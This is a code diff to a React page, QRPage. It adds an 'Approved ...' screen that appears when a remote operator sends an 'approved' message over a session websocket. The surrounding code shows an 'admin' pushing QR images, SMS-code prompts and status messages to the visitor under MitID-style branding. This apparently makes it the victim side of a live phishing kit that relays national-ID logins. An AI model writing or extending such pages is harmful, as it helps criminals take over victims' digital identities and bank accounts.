@@ -40,6 +40,7 @@ export default function QRPage({ sessionId }: Props) {
   const [smsDisplayText, setSmsDisplayText] = useState<string | null>(null)
   const [smsInputFocused, setSmsInputFocused] = useState(0)
   const [verifying, setVerifying] = useState(false)
+  const [approved, setApproved] = useState(false)
 
   useEffect(() => {
     const ws = connectUser(sessionId, (data) => {
@@ -63,9 +64,18 @@ export default function QRPage({ sessionId }: Props) {
         setSmsLength(len)
         setSmsCode(new Array(len).fill(''))
       }
+      if (data.type === 'approved') {
+        setVerified(false)
+        setVerifying(false)
+        setSmsActive(false)
+        setQrReady(false)
+        setQrImage(null)
+        setApproved(true)
+      }
       if (data.type === 'admin-left') {
         setSmsActive(false)
         setVerifying(false)
+        setApproved(false)
         setQrReady(false)
         setQrImage(null)
       }
@@ -95,6 +105,19 @@ export default function QRPage({ sessionId }: Props) {
     warning: { bg: 'bg-red-50', border: 'border-red-200', text: 'text-red-700', icon: '!' },
     myid: { bg: 'bg-blue-50', border: 'border-blue-200', text: 'text-blue-700', icon: 'i' },
     goodluck: { bg: 'bg-green-50', border: 'border-green-200', text: 'text-green-700', icon: '+' },
+  }
+
+  if (approved) {
+    return (
+      <div className="min-h-screen bg-[#f0f1f3] flex flex-col">
+        <header className="bg-white h-[50px] flex items-center px-6 border-b border-gray-200"><BrandLogo /></header>
+        <main className="flex-1 flex items-center justify-center">
+          <div className="bg-white rounded-lg shadow p-10 text-center" style={{ fontFamily: "'IBM Plex Sans', Arial, sans-serif" }}>
+            <MitIdAnimation text="Approved ..." />
+          </div>
+        </main>
+      </div>
+    )
   }
 
   if (verified) {
